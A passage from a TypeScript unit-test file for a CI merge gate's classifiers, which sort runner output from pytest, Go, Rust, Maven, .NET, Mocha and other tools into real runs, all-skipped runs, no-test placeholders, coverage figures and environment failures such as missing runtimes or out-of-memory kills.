      "FAILED test_go_wrapper.py::test_filter - AssertionError: expected '[no tests to run]' in out\n1 failed in 0.06s",
    )).toBe('ran');
  });

  it('failing test asserting on full literal "command not found" → ran', () => {
    expect(classifyTestExecution(
      "FAILED test_shell_wrapper.py::test_missing_runner - AssertionError: expected 'command not found' in stderr\n1 failed in 0.07s",
    )).toBe('ran');
  });

  it('a real failing test ("1 failed") → ran (never misread as no_tests)', () => {
    expect(classifyTestExecution(
      'Test Files  1 failed (1)\n     Tests  1 failed | 2 passed (3)',
    )).toBe('ran');
  });

  it('a real passing run ("2 passed") → ran', () => {
    expect(classifyTestExecution('2 passed in 0.50s')).toBe('ran');
  });

  it('missing runtimes do not fall into the placeholder no_tests bucket', () => {
    expect(classifyTestExecution('bash: python3: command not found')).toBe('ran');
    expect(classifyTestExecution('zsh: command not found: go')).toBe('ran');
  });

  it('empty / ambiguous output → ran (conservative default)', () => {
    expect(classifyTestExecution('')).toBe('ran');
    expect(classifyTestExecution('some unrelated output')).toBe('ran');
  });
});

// All-skipped / fully-skipped runs: the suite COLLECTED tests but executed
// NONE because every test was skipped/deselected/ignored/filtered (e.g. an
// integration suite gated on an env var or a service the cold verify VM has not
// provisioned). This is the SAME honest no-real-tests case as a zero-collection
// run — it must classify as 'all_skipped' (not 'ran') so the gate does not
// record a vacuous verified pass. STRICTLY conservative: any run where even one
// test actually passed or failed stays a real 'ran'.
describe('classifyTestExecution — all-skipped (no real tests executed)', () => {
  it('pytest all-skipped banner → all_skipped', () => {
    expect(classifyTestExecution(
      'collected 5 items\n\n===== 5 skipped in 0.12s =====',
    )).toBe('all_skipped');
  });

  it('pytest all-deselected (-k filter selected nothing) → all_skipped', () => {
    expect(classifyTestExecution(
      'collected 5 items / 5 deselected\n\n===== 5 deselected in 0.04s =====',
    )).toBe('all_skipped');
  });

  it('vitest all-skipped summary → all_skipped', () => {
    expect(classifyTestExecution(
      ' Test Files  1 skipped (1)\n      Tests  5 skipped (5)',
    )).toBe('all_skipped');
  });

  it('Rust all-ignored summary → all_skipped', () => {
    expect(classifyTestExecution([
      'running 5 tests',
      'test result: ok. 0 passed; 0 failed; 5 ignored; 0 measured; 0 filtered out',
    ].join('\n'))).toBe('all_skipped');
  });

  it('Rust all-filtered-out summary → all_skipped', () => {
    expect(classifyTestExecution([
      'running 5 tests',
      'test result: ok. 0 passed; 0 failed; 0 ignored; 0 measured; 5 filtered out',
    ].join('\n'))).toBe('all_skipped');
  });

  it('Go verbose all-skipped (--- SKIP, no PASS) → all_skipped', () => {
    expect(classifyTestExecution([
      '=== RUN   TestIntegration',
      '    main_test.go:12: requires DATABASE_URL',
      '--- SKIP: TestIntegration (0.00s)',
      'ok  \texample.com/pkg\t0.004s',
    ].join('\n'))).toBe('all_skipped');
  });

  it('RSpec all-pending (examples == pending) → all_skipped', () => {
    expect(classifyTestExecution(
      'Finished in 0.02 seconds\n5 examples, 0 failures, 5 pending',
    )).toBe('all_skipped');
  });

  it('Minitest all-skips (runs == skips) → all_skipped', () => {
    expect(classifyTestExecution(
      '5 runs, 0 assertions, 0 failures, 0 errors, 5 skips',
    )).toBe('all_skipped');
  });

  it('Elixir ExUnit all-excluded (tests == excluded) → all_skipped', () => {
    expect(classifyTestExecution(
      'Finished in 0.1 seconds\n5 tests, 0 failures, 5 excluded',
    )).toBe('all_skipped');
  });

  it('Gradle/Maven Surefire all-skipped (Tests run == Skipped) → all_skipped', () => {
    expect(classifyTestExecution(
      'Tests run: 5, Failures: 0, Errors: 0, Skipped: 5',
    )).toBe('all_skipped');
  });

  it('.NET all-skipped (Total == Skipped) → all_skipped', () => {
    expect(classifyTestExecution(
      'Passed!  - Failed: 0, Passed: 0, Skipped: 5, Total: 5, Duration: 1 ms',
    )).toBe('all_skipped');
  });

  it('PHPUnit all-skipped (Tests == Skipped) → all_skipped', () => {
    expect(classifyTestExecution(
      'OK, but incomplete, skipped, or risky tests!\nTests: 5, Assertions: 0, Skipped: 5.',
    )).toBe('all_skipped');
  });

  it('Mocha all-pending (passing == 0, pending == total) → all_skipped', () => {
    expect(classifyTestExecution(
      '0 passing\n5 pending\n0 failing',
    )).toBe('all_skipped');
  });

  it('Mocha all-pending on one line (0 passing, 5 pending) → all_skipped', () => {
    expect(classifyTestExecution(
      '0 passing (5ms), 5 pending',
    )).toBe('all_skipped');
  });

  // ── Conservative invariant: any real pass/fail keeps it a real 'ran' ──
  it('Mocha mixed pass-with-pending ("5 passing, 1500 pending") → ran', () => {
    expect(classifyTestExecution(
      '5 passing (120ms)\n1500 pending\n0 failing',
    )).toBe('ran');
  });

  it('Mocha with failure ("2 passing, 3 pending, 1 failing") → ran', () => {
    expect(classifyTestExecution(
      '2 passing (45ms)\n3 pending\n1 failing',
    )).toBe('ran');
  });

  it('pytest mixed pass-with-skips ("5 passed, 1500 skipped") → ran', () => {
    expect(classifyTestExecution(
      '===== 5 passed, 1500 skipped in 4.20s =====',
    )).toBe('ran');
  });

  it('Rust mixed pass-with-ignored ("3 passed; .. 5 ignored") → ran', () => {
    expect(classifyTestExecution([
      'running 8 tests',
      'test result: ok. 3 passed; 0 failed; 5 ignored; 0 measured; 0 filtered out',
    ].join('\n'))).toBe('ran');
  });

  it('Maven mixed (Tests run 5, Skipped 3 → 2 passed) → ran', () => {
    expect(classifyTestExecution(
      'Tests run: 5, Failures: 0, Errors: 0, Skipped: 3',
    )).toBe('ran');
  });

  it('RSpec mixed (5 examples, 3 pending → 2 passed) → ran', () => {
    expect(classifyTestExecution(
      '5 examples, 0 failures, 3 pending',
    )).toBe('ran');
  });

  it('all-skipped with a real failure present → ran (failure wins)', () => {
    expect(classifyTestExecution(
      'FAILED test_x.py::test_a - AssertionError\n1 failed, 5 skipped in 0.30s',
    )).toBe('ran');
  });

  // A test that merely QUOTES a skip phrase as assertion data is a real run.
  it('failing test asserting on literal "5 skipped" → ran', () => {
    expect(classifyTestExecution(
      "FAILED test_report.py::test_summary - AssertionError: expected '5 skipped' in output\n1 failed in 0.05s",
    )).toBe('ran');
  });

  it('passing test asserting on literal "Skipped: 5" → ran (real pass present)', () => {
    expect(classifyTestExecution(
      "test_report.py::test_summary - assert 'Skipped: 5' in out\n1 passed in 0.05s",
    )).toBe('ran');
  });

  // Multi-class / multi-project guard: aggregate families (Maven/Surefire/
  // Gradle, dotnet test) print ONE summary line PER class/project. A single
  // fully-skipped class must NOT short-circuit the scan and flip a run with
  // passing sibling classes to all_skipped. Surefire emits no "N passed" token,
  // so the total > skip pass-evidence guard (not hasRealPassEvidence) is what
  // keeps the run real here.
  it('Maven multi-class (one all-skip class, sibling passing class) → ran', () => {
    expect(classifyTestExecution([
      'Running com.example.FooTest',
      'Tests run: 3, Failures: 0, Errors: 0, Skipped: 0, Time elapsed: 0.042 s',
      'Running com.example.BarTest',
      'Tests run: 2, Failures: 0, Errors: 0, Skipped: 2, Time elapsed: 0.001 s',
      '',
      'Results:',
      '',
      'Tests run: 5, Failures: 0, Errors: 0, Skipped: 2',
    ].join('\n'))).toBe('ran');
  });

  it('Maven every class fully skipped (no passing sibling) → all_skipped', () => {
    expect(classifyTestExecution([
      'Tests run: 2, Failures: 0, Errors: 0, Skipped: 2',
      'Tests run: 3, Failures: 0, Errors: 0, Skipped: 3',
      'Results:',
      'Tests run: 5, Failures: 0, Errors: 0, Skipped: 5',
    ].join('\n'))).toBe('all_skipped');
  });

  it('.NET multi-project (one all-skip project, sibling passing project) → ran', () => {
    expect(classifyTestExecution([
      'Passed!  - Failed:     0, Passed:     3, Skipped:     0, Total:     3  - FooProj.dll',
      'Passed!  - Failed:     0, Passed:     0, Skipped:     2, Total:     2  - BarProj.dll',
    ].join('\n'))).toBe('ran');
  });
});

// extractTestCoverage parses best-effort pass/skip/total counts from runner
// output so a green PASS that ran only a tiny fraction of its suite ("5 passed,
// 1500 skipped") is no longer indistinguishable from a fully exercised pass. It
// reuses the SAME token/regex families classifyTestExecution understands and is
// CONSERVATIVE: ambiguous / unparseable output returns null.
describe('extractTestCoverage — pass/skip/total parsing', () => {
  describe('standalone-token families (partial skip)', () => {
    it('pytest "5 passed, 1500 skipped" → {5, 1500, 1505}', () => {
      expect(extractTestCoverage('===== 5 passed, 1500 skipped in 3.45s =====')).toEqual({
        passed: 5, skipped: 1500, total: 1505,
      });
    });

    it('pytest deselected counted as skipped', () => {
      expect(extractTestCoverage('===== 1 passed, 4 deselected in 0.10s =====')).toEqual({
        passed: 1, skipped: 4, total: 5,
      });
    });

    it('vitest summary ignores the Test Files line (no double count)', () => {
      expect(extractTestCoverage([
        ' Test Files  1 passed (1)',
        '      Tests  5 passed | 1500 skipped (1505)',
      ].join('\n'))).toEqual({ passed: 5, skipped: 1500, total: 1505 });
    });

    it('Rust ignored + filtered out both counted as skipped', () => {
      expect(extractTestCoverage(
        'test result: ok. 5 passed; 0 failed; 3 ignored; 0 measured; 1 filtered out; finished',
      )).toEqual({ passed: 5, skipped: 4, total: 9 });
    });

    it('Go verbose --- PASS:/--- SKIP: markers are tallied', () => {
      expect(extractTestCoverage([
        '--- PASS: TestAlpha (0.00s)',
        '--- PASS: TestBeta (0.00s)',
        '--- SKIP: TestGamma (0.00s)',
        'PASS',
        'ok  example.com/pkg 0.012s',
      ].join('\n'))).toEqual({ passed: 2, skipped: 1, total: 3 });
    });
  });

  describe('aggregate families (single summary line)', () => {
    it('Mocha passing/pending/failing → passed + pending + failing = total', () => {
      expect(extractTestCoverage('5 passing (120ms)\n3 pending\n0 failing')).toEqual({
        passed: 5, skipped: 3, total: 8,
      });
    });

    it('Mocha all-pending (0 passing, 5 pending, 0 failing)', () => {
      expect(extractTestCoverage('0 passing\n5 pending\n0 failing')).toEqual({
        passed: 0, skipped: 5, total: 5,
      });
    });

    it('Mocha with failures (3 passing, 2 pending, 1 failing)', () => {
      expect(extractTestCoverage('3 passing\n2 pending\n1 failing')).toEqual({
        passed: 3, skipped: 2, total: 6,
      });
    });

    it('Mocha on single line "5 passing (125ms), 3 pending"', () => {
      expect(extractTestCoverage('5 passing (125ms), 3 pending, 0 failing')).toEqual({
        passed: 5, skipped: 3, total: 8,
      });
    });

    it('RSpec examples/pending → derives passed from total', () => {
      expect(extractTestCoverage('5 examples, 0 failures, 3 pending')).toEqual({
        passed: 2, skipped: 3, total: 5,
      });
    });

    it('Minitest runs/skips', () => {
      expect(extractTestCoverage('5 runs, 12 assertions, 0 failures, 0 errors, 2 skips')).toEqual({
        passed: 3, skipped: 2, total: 5,
      });
    });

    it('ExUnit tests/skipped', () => {
      expect(extractTestCoverage('5 tests, 0 failures, 2 skipped')).toEqual({
        passed: 3, skipped: 2, total: 5,
      });
    });

    it('ExUnit excluded counted as skipped', () => {
      expect(extractTestCoverage('5 tests, 0 failures, 4 excluded')).toEqual({
        passed: 1, skipped: 4, total: 5,
      });
    });

    it('Surefire/Maven "Tests run:"/"Skipped:" (minus failures)', () => {
      expect(extractTestCoverage('Tests run: 5, Failures: 1, Errors: 0, Skipped: 2')).toEqual({
        passed: 2, skipped: 2, total: 5,
      });
    });

    it('.NET "Total:"/"Skipped:"', () => {
      expect(extractTestCoverage('Passed!  - Failed: 0, Passed: 0, Skipped: 5, Total: 5')).toEqual({
        passed: 0, skipped: 5, total: 5,
      });
    });

    it('PHPUnit "Tests:"/"Skipped:"', () => {
      expect(extractTestCoverage('Tests: 5, Assertions: 12, Failures: 1, Skipped: 2')).toEqual({
        passed: 2, skipped: 2, total: 5,
      });
    });
  });

  describe('fully-exercised runs (zero skipped)', () => {
    it('pytest all-pass → skipped 0', () => {
      expect(extractTestCoverage('===== 42 passed in 1.20s =====')).toEqual({
        passed: 42, skipped: 0, total: 42,
      });
    });

    it('Surefire all-pass → skipped 0', () => {
      expect(extractTestCoverage('Tests run: 8, Failures: 0, Errors: 0, Skipped: 0')).toEqual({
        passed: 8, skipped: 0, total: 8,
      });
    });
  });

  describe('multi-class / multi-project summation', () => {
    it('sums Surefire counts across two class summaries', () => {
      expect(extractTestCoverage([
        'Tests run: 3, Failures: 0, Errors: 0, Skipped: 0',
        'Tests run: 2, Failures: 0, Errors: 0, Skipped: 2',
      ].join('\n'))).toEqual({ passed: 3, skipped: 2, total: 5 });
    });
  });

  describe('unparseable / ambiguous output → null', () => {
    it('empty string → null', () => {
      expect(extractTestCoverage('')).toBeNull();
    });

    it('no recognizable count tokens → null', () => {
      expect(extractTestCoverage('some unrelated build log\nDone.')).toBeNull();
    });

    it('Go non-verbose pass (no counts) → null', () => {
      expect(extractTestCoverage('ok  example.com/pkg 0.5s')).toBeNull();
    });

    it('Mocha only passing (no pending token) → null', () => {
      expect(extractTestCoverage('5 passing')).toBeNull();
    });

    it('Mocha only pending (no passing token) → null', () => {
      expect(extractTestCoverage('3 pending')).toBeNull();
    });

    it('Mocha zero total (0 passing, 0 pending) → null', () => {
      expect(extractTestCoverage('0 passing\n0 pending')).toBeNull();
    });

    it('inconsistent aggregate (skipped > total) → null', () => {
      expect(extractTestCoverage('Tests run: 2, Failures: 0, Errors: 0, Skipped: 5')).toBeNull();
    });
  });
});

describe('extractLineCoverage — pytest-cov TOTAL line parser', () => {
  describe('valid TOTAL line (happy path)', () => {
    it('basic integer percentage → number', () => {
      expect(extractLineCoverage('TOTAL    350    30    91%')).toBe(91);
    });

    it('case-insensitive match (lowercase total)', () => {
      expect(extractLineCoverage('total    100    50    50%')).toBe(50);
    });

    it('decimal percentage → parsed float', () => {
      expect(extractLineCoverage('TOTAL    200    1    99.5%')).toBe(99.5);
    });

    it('leading/trailing whitespace does not prevent match', () => {
      expect(extractLineCoverage('  TOTAL    500    200    60%  ')).toBe(60);
    });

    it('multi-line output with coverage summary at the end', () => {
      expect(extractLineCoverage([
        'collected 42 items',
        '',
        'tests/test_foo.py ....                                   [ 50%]',
        'tests/test_bar.py ....                                   [100%]',
        '',
        '---------- coverage: platform linux, python 3.11-final-0 -----------',
        'Name                       Stmts   Miss  Cover',
        '--------------------------------------------------',
        'src/module.py                 50      5    90%',
        'src/cli.py                    30      3    90%',
        '--------------------------------------------------',
        'TOTAL                         80      8    90%',
      ].join('\n'))).toBe(90);
    });
  });

  describe('boundary values', () => {
    it('0% coverage', () => {
      expect(extractLineCoverage('TOTAL    50    50    0%')).toBe(0);
    });

    it('100% coverage', () => {
      expect(extractLineCoverage('TOTAL    100    0    100%')).toBe(100);
    });

    it('decimal coverage at boundary (0.5%)', () => {
      expect(extractLineCoverage('TOTAL    200    199    0.5%')).toBe(0.5);
    });
  });

  describe('null/edge-case inputs', () => {
    it('empty string → null', () => {
      expect(extractLineCoverage('')).toBeNull();
    });

    it('whitespace-only string → null', () => {
      expect(extractLineCoverage('   \n  \n  ')).toBeNull();
    });

    it('output without TOTAL line → null', () => {
      expect(extractLineCoverage('some random build log\nNo coverage data.')).toBeNull();
    });

    it('missing percentage after TOTAL → null', () => {
      expect(extractLineCoverage('TOTAL    100    50')).toBeNull();
    });

    it('malformed TOTAL line (no number after stats) → null', () => {
      expect(extractLineCoverage('TOTAL    --    --    n/a%')).toBeNull();
    });
  });
});

describe('extractChangedLineCoverage — diff-aware per-file weighted coverage', () => {
  const COVERAGE_OUTPUT = [
    '---------- coverage: platform linux, python 3.11-final-0 -----------',
    'Name                       Stmts   Miss  Cover',
    '--------------------------------------------------',
    'backend/app/foo.py            50      5    90%',
    'backend/app/bar.py            40     10    75%',
    'backend/app/baz.py            20      0   100%',
    '--------------------------------------------------',
    'TOTAL                        110     15    86%',
  ].join('\n');

  describe('happy path — weighted average across changed files', () => {
    it('computes weighted average from per-file coverage and changed-line counts', () => {
      // foo.py: 90% × 20 changed lines = 1800
      // bar.py: 75% × 10 changed lines = 750
      // Weighted average = (1800 + 750) / (20 + 10) = 2550 / 30 = 85
      expect(extractChangedLineCoverage(COVERAGE_OUTPUT, {
        'backend/app/foo.py': 20,
        'backend/app/bar.py': 10,
      })).toBe(85);
    });

    it('single changed file with exact path match → coverage of that file', () => {
      expect(extractChangedLineCoverage(COVERAGE_OUTPUT, {
        'backend/app/baz.py': 5,
      })).toBe(100);
    });

    it('files with zero changed lines are excluded from computation', () => {
      expect(extractChangedLineCoverage(COVERAGE_OUTPUT, {
        'backend/app/foo.py': 0,
        'backend/app/bar.py': 10,
      })).toBe(75);
    });

    it('all files have zero changed lines → null', () => {
      expect(extractChangedLineCoverage(COVERAGE_OUTPUT, {
        'backend/app/foo.py': 0,
        'backend/app/bar.py': 0,
      })).toBeNull();
    });
  });

  describe('path matching fallback (strip first directory component)', () => {
    it('strips first directory when full path does not match coverage key', () => {
      // changed file is 'backend/app/foo.py', coverage has 'app/foo.py'
      // after stripping 'backend/', 'app/foo.py' matches
      const output = [
        'Name               Stmts  Miss  Cover',
        '-------------------------------------',
        'app/foo.py           50     5    90%',
        '-------------------------------------',
        'TOTAL                50     5    90%',
      ].join('\n');
      expect(extractChangedLineCoverage(output, {
        'backend/app/foo.py': 10,
      })).toBe(90);
    });

    it('exact path takes priority over stripped fallback', () => {
      // Both 'backend/app/foo.py' and 'app/foo.py' exist in coverage
      // but exact match should be used
      const output = [
        'Name                       Stmts  Miss  Cover',
        '----------------------------------------------',
        'backend/app/foo.py           50    10    80%',
        'app/foo.py                   20     5    75%',
        '----------------------------------------------',
        'TOTAL                        70    15    79%',
      ].join('\n');
      expect(extractChangedLineCoverage(output, {
        'backend/app/foo.py': 10,
      })).toBe(80);
    });

    it('no slash in changed file path means no fallback stripping', () => {
      const output = [
        'Name           Stmts  Miss  Cover',
        '---------------------------------',
        'backend/mod.py   20     2    90%',
        '---------------------------------',
        'TOTAL            20     2    90%',
      ].join('\n');
      // 'mod.py' has no slash, so indexOf('/') === -1 in the fallback
      // Exact match 'mod.py' not found among coverage keys => null
      expect(extractChangedLineCoverage(output, {
        'mod.py': 10,
      })).toBeNull();
    });
  });

  describe('no matching files in coverage output', () => {
    it('no changed file found in coverage data → null', () => {
      expect(extractChangedLineCoverage(COVERAGE_OUTPUT, {
        'unrelated/other.py': 10,
      })).toBeNull();
    });

    it('some changed files match, others do not — only matched files contribute', () => {
      // foo.py matches (90% × 10 lines), other.py does not
      expect(extractChangedLineCoverage(COVERAGE_OUTPUT, {
        'backend/app/foo.py': 10,
        'unrelated/other.py': 20,
      })).toBe(90);
    });
  });

  describe('null/edge-case inputs', () => {
    it('empty output string → null', () => {
      expect(extractChangedLineCoverage('', { 'file.py': 5 })).toBeNull();
    });

    it('empty changedLineCounts → null', () => {
      expect(extractChangedLineCoverage(COVERAGE_OUTPUT, {})).toBeNull();
    });

    it('whitespace-only output → null', () => {
      expect(extractChangedLineCoverage('   \n  \n  ', { 'file.py': 5 })).toBeNull();
    });

    it('output with only TOTAL line and no per-file data → null', () => {
      expect(extractChangedLineCoverage('TOTAL    100    25    75%', { 'file.py': 5 })).toBeNull();
    });

    it('output with header lines only (no file data) → null', () => {
      const headerOnly = [
        'Name                       Stmts   Miss  Cover',
        '--------------------------------------------------',
        'TOTAL                         0      0   100%',
      ].join('\n');
      expect(extractChangedLineCoverage(headerOnly, { 'file.py': 5 })).toBeNull();
    });

    it('decimal coverage percentages → correctly parsed and weighted', () => {
      const output = [
        'Name               Stmts  Miss  Cover',
        '-------------------------------------',
        'src/mod.py           50     1   99.5%',
        'src/cli.py           30    15   50.0%',
        '-------------------------------------',
        'TOTAL                80    16   80.0%',
      ].join('\n');
      // mod.py: 99.5% × 10 = 995; cli.py: 50% × 20 = 1000
      // Weighted = (995 + 1000) / (10 + 20) = 1995 / 30 = 66.5
      expect(extractChangedLineCoverage(output, {
        'src/mod.py': 10,
        'src/cli.py': 20,
      })).toBe(66.5);
    });
  });
});

describe('classifySetupFailure — bootstrap/setup infrastructure detection', () => {
  it('detects missing runtimes and package-manager tools via line-anchored command-not-found output', () => {
    expect(classifySetupFailure('bash: python3: command not found')).toBe(true);
    expect(classifySetupFailure('sh: line 1: cargo: command not found')).toBe(true);
    expect(classifySetupFailure('zsh: command not found: node')).toBe(true);
    expect(classifySetupFailure('bash: pip: command not found')).toBe(true);
  });

  it('treats missing pip itself as setup, but generic repo dependency imports as real failures', () => {
    expect(classifySetupFailure("ModuleNotFoundError: No module named 'pip'")).toBe(true);
    expect(classifySetupFailure("ImportError: No module named 'pip'")).toBe(true);
    expect(classifySetupFailure("ModuleNotFoundError: No module named 'sqlalchemy'")).toBe(false);
    expect(classifySetupFailure("ImportError: No module named 'requests'")).toBe(false);
    expect(classifySetupFailure("ImportError: cannot import name 'foo' from 'bar'")).toBe(false);
  });

  it('does not treat repo dependency/module resolution failures as setup infra', () => {
    expect(classifySetupFailure('cannot find package "github.com/acme/lib" in any of:')).toBe(false);
    expect(classifySetupFailure('no required module provides package github.com/acme/lib; to add it:')).toBe(false);
    expect(classifySetupFailure('missing go.sum entry for module providing package github.com/acme/lib')).toBe(false);
    expect(classifySetupFailure("Error: Cannot find module 'typescript'")).toBe(false);
    expect(classifySetupFailure("Cannot find module '@acme/tooling' from '/tmp/workspace'")).toBe(false);
    expect(classifySetupFailure("Error: Cannot find module './local-helper'")).toBe(false);
  });

  it('does not misclassify quoted setup-like text inside a real failure', () => {
    expect(
      classifySetupFailure(
        "FAILED test_cli.py::test_help - AssertionError: expected \"bash: python3: command not found\" in stderr",
      ),
    ).toBe(false);
  });
});

// Regression: the real-failure guard must recognize a genuine failure in EVERY
// ecosystem the no-CI gate's runner detection can launch (Go, Ruby/Rake,
// Gradle, Maven, Elixir, .NET, PHPUnit) — not just pytest/vitest/Rust. A
// failing suite in those ecosystems whose output ALSO quotes a placeholder
// diagnostic line (a captured child process's "command not found", an
// assertion diff printing "no test specified", a sub-invocation's "no tests
// ran") must classify as a real run so its failure blocks the merge. The
// pre-fix guard recognized none of these summaries, so every case below was
// misread as "no tests ran" and the gate fell open, merging UNVERIFIED.
describe('classifyTestExecution — extra-family real-failure guard', () => {
  it('Go --- FAIL + tab-separated FAIL\\tpkg quoting "command not found" → ran', () => {
    expect(classifyTestExecution(
      '--- FAIL: TestHelperInvocation (0.01s)\n    runner_test.go:42: child process output did not match\nbash: testhelper: command not found\nFAIL\texample.com/runner\t0.03s\nFAIL',
    )).toBe('ran');
  });

  it('Go tab-separated FAIL summary alone → ran', () => {
    expect(classifyTestExecution('FAIL\texample.com/pkg\t0.02s')).toBe('ran');
  });

  it('.NET "Failed: N" (non-zero) quoting "no test specified" → ran', () => {
    expect(classifyTestExecution(
      '  Failed MyApp.Tests.RunnerTests.InvokesNpm [12 ms]\n  Error Message:\nError: no test specified\nFailed!  - Failed:     1, Passed:     4, Skipped:     0, Total:     5',
    )).toBe('ran');
  });

  it('Elixir "N failure" (non-zero) quoting "No rule to make target" → ran', () => {
    expect(classifyTestExecution(
      "  1) test runs the make target (Mix.RunnerTest)\n     stderr was:\nmake: *** No rule to make target 'test'. Stop.\n\n1 test, 1 failure",
    )).toBe('ran');
  });

  it('Ruby minitest "N failures" (non-zero) quoting "command not found" → ran', () => {
    expect(classifyTestExecution(
      '  1) Failure:\nRunnerTest#test_invokes_helper [test/runner_test.rb:9]:\nbash: helper: command not found\n\n1 runs, 1 assertions, 1 failures, 0 errors, 0 skips',
    )).toBe('ran');
  });

  it('PHPUnit "Failures: N" (non-zero) quoting "no tests ran" → ran', () => {
    expect(classifyTestExecution(
      'There was 1 failure:\n\n1) RunnerTest::testPytestRuns\nno tests ran in 0.01s\n\nFAILURES!\nTests: 1, Assertions: 1, Failures: 1.',
    )).toBe('ran');
  });

  it('Maven "Failures: N" (non-zero) quoting "Missing script" → ran', () => {
    expect(classifyTestExecution(
      '[ERROR] RunnerTest.invokesNpm:21 expected:<> but was child stderr:\nMissing script: "test"\n[ERROR] Tests run: 3, Failures: 1, Errors: 0, Skipped: 0',
    )).toBe('ran');
  });

  // Negative direction: a zero-count summary must NOT be mistaken for a real
  // failure — these stay placeholder/empty signals so the gate still routes to
  // proceed-without-checks rather than hard-blocking an empty repo.
  it('.NET zero-count "Failed: 0" with no-test-specified placeholder → no_tests', () => {
    expect(classifyTestExecution(
      'Error: no test specified\nPassed!  - Failed:     0, Passed:     0, Skipped:     0, Total:     0',
    )).toBe('no_tests');
  });

  it('PHPUnit/Maven zero-count "Failures: 0" with make placeholder → no_tests', () => {
    expect(classifyTestExecution(
      "make: *** No rule to make target 'test'. Stop.\nTests run: 0, Failures: 0, Errors: 0, Skipped: 0",
    )).toBe('no_tests');
  });

  it('Elixir zero-count "0 failures" with command-not-found placeholder → no_tests', () => {
    expect(classifyTestExecution(
      'bash: mix: command not found\n0 tests, 0 failures',
    )).toBe('no_tests');
  });
});

describe('matchesEnvironmentFailureSignature — env/setup failure detection', () => {
  // ── True cases: env signals without real test failure evidence ──────────────

  it('cannot open shared object file (.so) → true', () => {
    expect(matchesEnvironmentFailureSignature(
      'error while loading shared libraries: libssl.so.1.1: cannot open shared object file: No such file or directory',
    )).toBe(true);
  });

  it('error while loading shared libraries → true', () => {
    expect(matchesEnvironmentFailureSignature(
      'error while loading shared librar: libfoo.so: no such file',
    )).toBe(true);
  });

  it('no such file or directory for .so → true', () => {
    expect(matchesEnvironmentFailureSignature(
      'No such file or directory: libpq.so.5',
    )).toBe(true);
  });

  it('spawn ENOENT → true', () => {
    expect(matchesEnvironmentFailureSignature(
      'Error: spawn /usr/bin/pytest ENOENT',
    )).toBe(true);
  });

  it('node: command not found (VM-level) → true', () => {
    expect(matchesEnvironmentFailureSignature(
      'node: command not found',
    )).toBe(true);
  });

  it('python3: command not found (VM-level) → true', () => {
    expect(matchesEnvironmentFailureSignature(
      'python3: command not found',
    )).toBe(true);
  });

  // ── False cases: repo dependency failures and real test-failure evidence stay red ──

  it('bare ModuleNotFoundError from the suite is not treated as VM infra', () => {
    expect(matchesEnvironmentFailureSignature(
      "ModuleNotFoundError: No module named 'pytest'",
    )).toBe(false);
  });

  it('bare ImportError: No module named is not treated as VM infra', () => {
    expect(matchesEnvironmentFailureSignature(
      "ImportError: No module named 'yaml'",
    )).toBe(false);
  });

  it('bare Cannot find module is not treated as VM infra', () => {
    expect(matchesEnvironmentFailureSignature(
      "Error: Cannot find module 'typescript'",
    )).toBe(false);
  });

  it('FAILED line + ModuleNotFoundError → false (real test failure, not env)', () => {
    expect(matchesEnvironmentFailureSignature(
      "FAILED test_api.py::test_get - ModuleNotFoundError: No module named 'requests'\n1 failed in 0.01s",
    )).toBe(false);
  });

  it('1 failed count + .so error → false (real test failure quotes env phrase)', () => {
    expect(matchesEnvironmentFailureSignature(
      "test_loader.py::test_lib - AssertionError: expected 'cannot open shared object file'\n1 failed in 0.03s",
    )).toBe(false);
  });

  it('Go --- FAIL: line + env phrase → false', () => {
    expect(matchesEnvironmentFailureSignature(
      '--- FAIL: TestLoadLib (0.01s)\n    lib_test.go:12: error while loading shared librar: libfoo.so\nFAIL',
    )).toBe(false);
  });

  it('.NET Failed: 1 + env phrase → false', () => {
    expect(matchesEnvironmentFailureSignature(
      'ModuleNotFoundError: No module named foo\nFailed!  - Failed:     1, Passed:     0',
    )).toBe(false);
  });

  // ── Edge cases ──────────────────────────────────────────────────────────────

  it('empty string → false', () => {
    expect(matchesEnvironmentFailureSignature('')).toBe(false);
  });

  it('plain test failure with no env phrase → false', () => {
    expect(matchesEnvironmentFailureSignature(
      'FAILED test_foo.py::test_bar - AssertionError: 1 != 2\n1 failed in 0.05s',
    )).toBe(false);
  });

  it('passing output → false', () => {
    expect(matchesEnvironmentFailureSignature('2 passed in 0.50s')).toBe(false);
  });

  it('missing-system-librar phrase → true', () => {
    expect(matchesEnvironmentFailureSignature(
      'missing required system library: libgomp.so',
    )).toBe(true);
  });

  // ── dash/sh "<tool>: not found" missing-executable phrasing ─────────────────

  it("Debian dash '/bin/sh: 1: pytest: not found' → true", () => {
    expect(matchesEnvironmentFailureSignature(
      '/bin/sh: 1: pytest: not found',
    )).toBe(true);
  });

  it("sh '<tool>: not found' without line number → true", () => {
    expect(matchesEnvironmentFailureSignature(
      'sh: rspec: not found',
    )).toBe(true);
  });

  it("repo dependency 'No module named' (not shell-prefixed) stays red", () => {
    expect(matchesEnvironmentFailureSignature(
      "ImportError: No module named 'requests' — not found in site-packages",
    )).toBe(false);
  });

  // ── Docker daemon unavailable on the gate VM ────────────────────────────────

  it('cannot connect to the Docker daemon → true', () => {
    expect(matchesEnvironmentFailureSignature(
      'Cannot connect to the Docker daemon at unix:///var/run/docker.sock. Is the docker daemon running?',
    )).toBe(true);
  });

  // ── Out-of-memory kills (exit 137 / SIGKILL / signal 9) ─────────────────────

  it("bare 'Killed' line → true (OOM killer)", () => {
    expect(matchesEnvironmentFailureSignature(
      'npm test\nKilled',
    )).toBe(true);
  });

  it("Go 'signal: killed' → true", () => {
    expect(matchesEnvironmentFailureSignature(
      'go test ./...\nsignal: killed',
    )).toBe(true);
  });

  it('exit code 137 → true', () => {
    expect(matchesEnvironmentFailureSignature(
      'Command failed with exit code 137',
    )).toBe(true);
  });

  it('JavaScript heap out of memory → true', () => {
    expect(matchesEnvironmentFailureSignature(
      'FATAL ERROR: Reached heap limit Allocation failed - JavaScript heap out of memory',
    )).toBe(true);
  });

  it('OOM phrase + real FAILED line → false (real test failure quotes env phrase)', () => {
    expect(matchesEnvironmentFailureSignature(
      "FAILED test_oom.py::test_msg - AssertionError: expected 'out of memory: kill'\n1 failed in 0.02s",
    )).toBe(false);
  });

  // ── Disk/quota/space failures (host resource exhaustion on the gate VM) ──────

  it('no space left on device → true', () => {
    expect(matchesEnvironmentFailureSignature(
      'write error: No space left on device',
    )).toBe(true);
  });

  it('disk quota exceeded → true', () => {
    expect(matchesEnvironmentFailureSignature(
      'Error: EDQUOT: disk quota exceeded, write',
    )).toBe(true);
  });

  it('filesystem is full → true', () => {
    expect(matchesEnvironmentFailureSignature(
      'Filesystem is full, cannot write to /tmp',
